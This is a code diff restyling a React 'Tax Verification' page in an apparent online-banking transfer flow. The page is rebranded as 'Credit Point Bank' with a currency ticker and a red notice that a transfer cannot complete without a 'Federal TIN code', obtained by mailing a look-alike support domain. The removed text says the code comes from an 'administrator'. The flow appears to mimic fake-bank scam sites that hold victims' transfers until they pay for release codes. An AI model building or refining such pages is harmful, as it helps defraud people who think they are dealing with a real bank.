@@ -79,75 +79,79 @@ export default function TransferTIN() {
   };
 
   return (
-    <div className="min-h-screen bg-background bg-banking-gradient p-4 md:p-6">
-      <div className="max-w-2xl mx-auto space-y-6">
-        <div className="flex items-center space-x-4">
-          <Button variant="ghost" size="icon" onClick={() => navigate("/transfer/security")}>
-            <ArrowLeft className="h-5 w-5" />
-          </Button>
-          <h1 className="text-3xl font-bold text-foreground">Tax Verification</h1>
+    <div className="min-h-screen bg-gray-100 p-4">
+      <div className="max-w-md mx-auto">
+        {/* Header */}
+        <div className="bg-white border-b border-gray-200 p-4 flex items-center justify-between mb-4">
+          <div className="flex items-center space-x-3">
+            <div className="text-2xl font-bold text-blue-600">CPB</div>
+            <div className="text-xs text-gray-500">CREDIT POINT BANK</div>
+          </div>
+          <div className="w-8 h-8 bg-blue-500 rounded-full flex items-center justify-center">
+            <div className="w-4 h-4 bg-white rounded-full"></div>
+          </div>
         </div>
 
-        <Card className="bg-card/80 backdrop-blur-glass border-border shadow-glass">
-          <CardHeader>
-            <CardTitle className="flex items-center space-x-2">
-              <FileText className="h-5 w-5 text-primary" />
-              <span>Enter Tax Identification Number</span>
-            </CardTitle>
-          </CardHeader>
-          <CardContent className="space-y-6">
-            <div className="space-y-4">
-              <p className="text-muted-foreground">
-                Please enter the Tax Identification Number (TIN) provided by your administrator
-              </p>
-              
-              <div className="space-y-2">
-                <label htmlFor="tin" className="text-sm font-medium">
-                  TIN Number
-                </label>
-                <Input
-                  id="tin"
+        {/* Currency ticker */}
+        <div className="bg-white border border-gray-200 px-2 py-1 mb-4 overflow-hidden">
+          <div className="flex space-x-4 text-xs text-gray-600 whitespace-nowrap animate-scroll">
+            <span className="text-red-500">• 176 ▼</span>
+            <span>GBP/USD = 1.29455 ▼</span>
+            <span className="text-green-500">GBP/NZD = 2.26481 ▲</span>
+            <span>GBP/TRY = 49.1</span>
+          </div>
+        </div>
+
+        {/* Main content */}
+        <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-6">
+          <div className="text-center mb-6">
+            <div className="w-16 h-16 bg-red-500 rounded-full flex items-center justify-center mx-auto mb-4">
+              <div className="text-white text-2xl font-bold">!</div>
+            </div>
+            <h1 className="text-xl font-semibold text-gray-800 mb-2">
+              Tax Identification Number is Required.
+            </h1>
+            <p className="text-sm text-red-500 mb-6">
+              The Federal TIN code is required for this transaction can be completed successfully. 
+              You can visit any of our nearest branches or contact our online customer care 
+              representative with: for more details send mail to support@creditpointbnk.com
+            </p>
+          </div>
+
+          <div className="space-y-4">
+            <div>
+              <label className="block text-sm text-gray-700 mb-2">
+                Enter TIN:
+              </label>
+              <div className="relative">
+                <input
                   type="text"
-                  placeholder="Enter TIN number"
                   value={tinNumber}
                   onChange={(e) => setTinNumber(e.target.value)}
-                  className="text-center text-lg tracking-wider"
+                  className="w-full p-3 border border-gray-300 rounded-md text-center text-lg tracking-widest focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
+                  placeholder="xxxxxx"
+                  maxLength={10}
                 />
+                <div className="absolute right-3 top-3 text-gray-400 text-sm">TIN</div>
               </div>
             </div>
 
-            <div className="bg-blue-500/10 p-4 rounded-lg border border-blue-500/20">
-              <p className="text-sm text-blue-700 dark:text-blue-400">
-                Your TIN is required for tax compliance and transfer verification purposes.
+            <div className="bg-gray-50 p-3 rounded-md">
+              <p className="text-xs text-gray-600">
+                We have security measures in place to safeguard your money, because we are 
+                committed to providing you with a secure banking experience.
               </p>
             </div>
 
-            <div className="flex space-x-3">
-              <Button 
-                variant="outline" 
-                className="flex-1"
-                onClick={() => navigate("/transfer/security")}
-              >
-                Back
-              </Button>
-              <Button 
-                onClick={handleSubmit} 
-                className="flex-1 bg-primary hover:bg-primary/90"
-                size="lg"
-                disabled={tinNumber.length < 10 || isLoading}
-              >
-                {isLoading ? (
-                  <>
-                    <Loader2 className="mr-2 h-4 w-4 animate-spin" />
-                    Verifying...
-                  </>
-                ) : (
-                  'Continue'
-                )}
-              </Button>
-            </div>
-          </CardContent>
-        </Card>
+            <button
+              onClick={handleSubmit}
+              disabled={tinNumber.length < 10 || isLoading}
+              className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-gray-300 disabled:cursor-not-allowed text-white py-3 rounded-md font-medium transition-colors"
+            >
+              {isLoading ? 'Verifying...' : 'Verify'}
+            </button>
+          </div>
+        </div>
       </div>
     </div>
   );
